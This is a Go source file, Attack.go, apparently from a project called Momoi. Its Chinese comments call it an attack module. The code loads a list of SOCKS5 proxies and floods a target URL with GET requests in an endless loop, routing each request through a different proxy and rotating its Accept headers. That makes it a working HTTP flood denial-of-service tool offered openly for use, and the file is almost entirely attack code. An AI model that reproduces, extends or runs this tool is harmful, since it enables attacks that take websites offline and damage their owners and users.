/*
 * @Author: NyanCatda
 * @Date: 2022-09-09 23:30:37
 * @LastEditTime: 2022-09-10 00:04:38
 * @LastEditors: NyanCatda
 * @Description: 攻击模块
 * @FilePath: \Momoi\Attack.go
 */
package main

import (
	"encoding/json"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/nyancatda/AyaLog"
	"github.com/nyancatda/Momoi/Tools/File"
	"github.com/nyancatda/Momoi/Tools/Pool"
	"golang.org/x/net/proxy"
)

/**
 * @description: 开始攻击
 * @param {string} URL 需要攻击的URL
 * @param {int} PoolNum 线程池内线程数量
 * @return {*}
 */
func AttackStart(URL string, PoolNum int) {
	if PoolNum <= 0 {
		PoolNum = 1
	}

	// 获取代理列表
	ProxysFile, err := File.NewFileReadWrite(ProxysFileName, os.O_RDONLY)
	if err != nil {
		AyaLog.Error("System", err)
		os.Exit(0)
	}
	ProxysFileBody, err := ProxysFile.Read()
	if err != nil {
		AyaLog.Error("System", err)
		os.Exit(0)
	}

	var ProxysList []string
	err = json.Unmarshal([]byte(ProxysFileBody), &ProxysList)
	if err != nil {
		AyaLog.Error("System", err)
		os.Exit(0)
	}

	// 开始攻击
	AyaLog.Info("System", "开始攻击")
	wg := Pool.NewPool(PoolNum)

	Request := func(Proxy string) {
		defer wg.Done()
		Dialer, err := proxy.SOCKS5("tcp", Proxy, nil, proxy.Direct)
		if err != nil {
			return
		}
		httpTransport := &http.Transport{}
		httpTransport.Dial = Dialer.Dial

		// 发起请求后立刻超时关闭
		TimeOut := time.Second * 1

		// 设置请求参数
		httpClient := &http.Client{
			Transport: httpTransport,
			Timeout:   TimeOut,
		}

		Reqest, err := http.NewRequest("GET", URL, nil)

		//设置请求头
		var Headers = []string{
			"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
			"Accept-Encoding:gzip, deflate\r\n",
			"Accept-Language:en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
			"Accept:text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
			"Accept:application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
			"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
			"Accept:image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
			"Accept:text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
			"Accept:text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,",
			"Accept:text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
			"Accept-Charset:utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
			"Accept:text/html, application/xhtml+xml",
			"Accept-Language:en-US,en;q=0.5\r\n",
			"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
			"Accept:text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		}
		for _, Header := range Headers {
			Headervalue := strings.SplitN(Header, ":", 2)
			Reqest.Header.Set(Headervalue[0], Headervalue[1])
		}

		Resp, err := httpClient.Do(Reqest)
		if err != nil {
			return
		}
		defer Resp.Body.Close()

		AyaLog.Info("System", Proxy, "->", URL, Resp.Status)
	}

	// 循环开始攻击
	for {
		for _, Proxy := range ProxysList {
			wg.Add(1)
			go Request(Proxy)
		}
	}
}
